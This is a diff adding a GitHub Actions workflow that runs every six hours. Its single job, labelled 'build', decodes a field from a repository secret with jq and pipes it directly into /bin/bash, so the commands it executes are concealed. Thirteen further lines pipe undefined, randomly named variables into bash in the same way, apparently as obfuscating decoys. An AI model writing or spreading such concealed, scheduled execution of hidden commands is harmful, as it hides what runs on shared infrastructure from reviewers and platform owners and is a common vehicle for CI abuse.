@@ -1,0 +1,30 @@
+name: lingzunqianlz
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '3 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: lingzunqianlz
+        env:
+          fufa299: ${{ secrets.fufa299 }}
+        run: |
+          echo $fufa299 | jq -r .hdzow54679 | /bin/bash
+          echo $a63294 | jq -r .c8157 | /bin/bash
+          echo $mmi01206 | jq -r .euyov757 | /bin/bash
+          echo $xtz9838 | jq -r .btjz7 | /bin/bash
+          echo $ryjfh3713 | jq -r .n9 | /bin/bash
+          echo $xw824 | jq -r .sazvc1158 | /bin/bash
+          echo $iva1 | jq -r .szpjn0736 | /bin/bash
+          echo $fg830 | jq -r .qhzkg6801 | /bin/bash
+          echo $bmqa6 | jq -r .g909 | /bin/bash
+          echo $wt6 | jq -r .r23 | /bin/bash
+          echo $uqluj31887 | jq -r .tacb091 | /bin/bash
+          echo $axeaw3701 | jq -r .wyu955 | /bin/bash
+          echo $ail799 | jq -r .i38504 | /bin/bash
+          echo $xa988 | jq -r .mc7314 | /bin/bash
+
